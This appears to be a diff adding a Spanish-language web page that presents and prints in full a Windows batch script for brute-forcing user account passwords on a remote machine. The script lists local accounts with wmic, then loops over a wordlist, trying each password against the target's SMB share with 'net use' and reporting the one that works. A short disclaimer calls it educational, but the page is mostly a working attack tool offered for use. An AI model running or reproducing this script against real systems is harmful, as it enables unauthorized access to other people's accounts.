@@ -1,0 +1,137 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Brute Force - Información</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            line-height: 1.6;
+            background-color: Gray;
+            margin: 0;
+            padding: 20px;
+        }
+
+        header {
+            text-align: center;
+            background: #007BFF;
+            color: white;
+            padding: 20px 0;
+            margin-bottom: 20px;
+			border-radius: 20px;
+        }
+
+        main {
+            background: white;
+            padding: 20px;
+            border-radius: 5px;
+            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
+        }
+
+        h1, h2 {
+            color: #333;
+        }
+
+        p, li {
+            margin: 10px 0;
+        }
+
+        .code {
+            background-color: #e9ecef;
+            border-left: 4px solid #007BFF;
+            padding: 10px;
+            margin: 10px 0;
+            font-family: monospace;
+        }
+
+        .footer {
+            text-align: center;
+            margin-top: 20px;
+            font-size: 14px;
+            color: #666;
+        }
+
+        .note {
+            background-color: #ffeb3b;
+            border: 1px solid #fbc02d;
+            padding: 10px;
+            border-radius: 5px;
+            margin: 20px 0;
+        }
+    </style>
+</head>
+<body>
+
+<header>
+    <h1>Brute Force - Maykel Millan</h1>
+    <p>Úselo bajo su propia responsabilidad</p>
+</header>
+
+<main>
+    <h2>Descripción del Script</h2>
+    <p>Este script está diseñado para realizar ataques de fuerza bruta a cuentas de usuario en un sistema remoto utilizando una lista de contraseñas.</p>
+
+    <h2>Funcionamiento</h2>
+    <ul>
+        <li>Muestra las cuentas de usuario disponibles en el sistema.</li>
+        <li>Solicita el nombre de usuario, la dirección IP del objetivo y la lista de contraseñas.</li>
+        <li>Itera a través de cada contraseña en la lista y realiza un intento de autenticación.</li>
+        <li>Si la contraseña es correcta, notifica al usuario y desconecta la unidad de red.</li>
+        <li>Si la contraseña no se encuentra, informa al usuario después de probar todas las opciones.</li>
+    </ul>
+
+    <h2>Código del Script</h2>
+    <div class="code">
+        <pre>
+@echo off
+title Brute Force - Maykel Millan
+color 6
+echo                                   Bienvenido a Brute-Force
+
+wmic useraccount get name,sid,status
+
+set /p user="Username >> "
+set /p ip="Address >> "
+set /p list="WordList >> "
+set /a count=0
+
+:loop
+for /f "tokens=\*" %%a in (%list%) do (
+    set "pass=%%a"
+    call :attempt
+    set /a count+=1
+)
+color 4
+echo Password no encontrada :(
+pause
+exit /b
+
+:success
+color a
+echo Password Encontrada : %pass%
+net use \\%ip% /d /y >nul 2>&1
+pause
+exit 
+
+:attempt
+net use \\%ip% /user:%user% %pass% >nul 2>&1
+if %errorlevel% EQU 0 goto success
+echo [INTENTO: %count%][%pass%]
+exit /b
+        </pre>
+    </div>
+
+    <h2>Importante</h2>
+    <div class="note">
+        <p>Este script se proporciona solo con fines educativos y de investigación. El uso malintencionado de esta herramienta puede ser ilegal y podría generar consecuencias legales.</p>
+    </div>
+
+</main>
+
+<div class="footer">
+    <p>&copy; 2023 Brute Force - Maykel Millan</p>
+</div>
+
+</body>
+</html>
